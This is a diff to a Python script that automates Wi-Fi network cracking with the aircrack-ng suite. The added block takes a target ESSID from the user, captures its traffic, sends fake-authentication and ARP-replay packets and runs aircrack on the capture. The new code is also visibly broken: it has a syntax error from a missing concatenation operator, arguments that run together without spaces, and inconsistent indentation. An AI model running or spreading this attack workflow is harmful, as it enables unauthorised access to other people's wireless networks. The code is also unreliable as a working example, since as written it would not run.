@@ -41,7 +41,7 @@ WASH_POWER = 2
 AIRCRACK = '/usr/bin/aircrack-ng'
 AIREPLAY = '/usr/bin/aireplay-ng'
 AIRODUMP = '/usr/bin/airodump-ng'
-WASH = '/usr/bin/wash -C'
+WASH = '/usr/bin/wash'
 REAVER = '/usr/bin/reaver'
 IFCONFIG = '/usr/bin/ifconfig'
 IWCONFIG = '/usr/bin/iwconfig'
@@ -106,7 +106,7 @@ def showtable(thekeys, thetable):
 		
 # Main loop		
 def runmain():
-	
+		
 	# Init
 	global iface
 	global scantime
@@ -167,9 +167,9 @@ def runmain():
 			remove(r'quickscan.wash')		
 		dprint('Starting ' + WASH)
 		if (showscan != 1):
-			Popen(WASH + ' -o quickscan.wash -i ' + iface, shell=True, stderr=PIPE, stdout=PIPE)
+			Popen(WASH + ' -C -o quickscan.wash -i ' + iface, shell=True, stderr=PIPE, stdout=PIPE)
 		else:
-			popen(WASH + ' -o quickscan.wash -i ' + iface)
+			popen(WASH + ' -C -o quickscan.wash -i ' + iface)
 
 		# Sleep wash
 		dprint('wash scanning for ' + repr(washtime) + ' seconds...')
@@ -268,8 +268,19 @@ def runmain():
 		who2crak = input('Please enter the ESSID to attack: ').replace('\n', '').strip()
 		for ap in aptable:
 			if (ap[colnames[DUMP_ESSID]] == who2crak):
-				dprint('Not Implemented yet sorry', 1)
-				return 0
+#				dprint('Not Implemented yet sorry', 1)
+#				return 0
+			    system(IWCONFIG + ' ' + iface + 'channel ' + ap[colnames[DUMP_CHANNEL]])
+				popen(AIRODUMP + ' --write crackscan ' + iface '--bssid ' + ap[colnames[DUMP_BSSID]] + '--channel ' + ap[colnames[DUMP_CHANNEL]]) 
+				system(AIREPLAY + ' --fakeauth 0 -a ' + ap[colnames[DUMP_BSSID]] + iface)
+				popen(AIREPLAY + ' --arpreplay ' + iface + ' -b ' + ap[colnames[DUMP_BSSID]])
+				sleep(10)
+				Popen(AIRCRACK + ' crackscan.cap', shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE)
+				dummything = input('Press [ENTER] to continue...')
+				system(KILLALL + ' ' + AIREPLAY)
+				system(KILLALL + ' ' + AIRODUMP)
+				system(KILLALL + ' ' + AIRCRACK)
+				return 0;
 		dprint('Invalid ESSID selected, you MUST type this correctly. Aborting...', 1)
 		return 1						
 
